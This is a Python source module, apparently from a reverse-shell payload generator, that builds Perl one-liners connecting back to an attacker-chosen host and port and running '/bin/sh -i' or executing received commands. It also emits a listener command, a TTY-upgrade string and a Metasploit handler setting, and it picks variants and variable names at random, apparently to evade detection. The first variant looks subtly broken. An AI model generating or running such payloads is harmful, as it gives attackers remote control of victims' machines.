import random
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, LISTENER_FMT

_VARIANTS = ["socket_exec", "socket_fork"]


class PerlGenerator(ShellGenerator):
    language = "perl"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)
        if variant == "socket_exec":
            cmd = self._socket_exec(opts, names)
        else:
            cmd = self._socket_fork(opts, names)

        return ShellResult(
            command=cmd, variant=variant, language=self.language, arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=TTY_UPGRADE,
            msf_compat=msf_handler("payload/cmd/unix/reverse_perl", opts.lhost, opts.lport),
        )

    def _socket_exec(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        sock = self._var("sock", names)
        return (
            f"perl -e 'use Socket;"
            f"${sock}=IO::Socket::INET->new(PeerAddr=>\"{opts.lhost}\","
            f"PeerPort=>\"{opts.lport}\",Proto=>\"tcp\");"
            f"STDIN->fdopen(${sock},r);$~->fdopen(${sock},w);"
            f"system$_ while<>'"
        )

    def _socket_fork(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        return (
            f'perl -e \'use Socket;$i="{opts.lhost}";$p={opts.lport};'
            f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");'
            f'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}};\''
        )
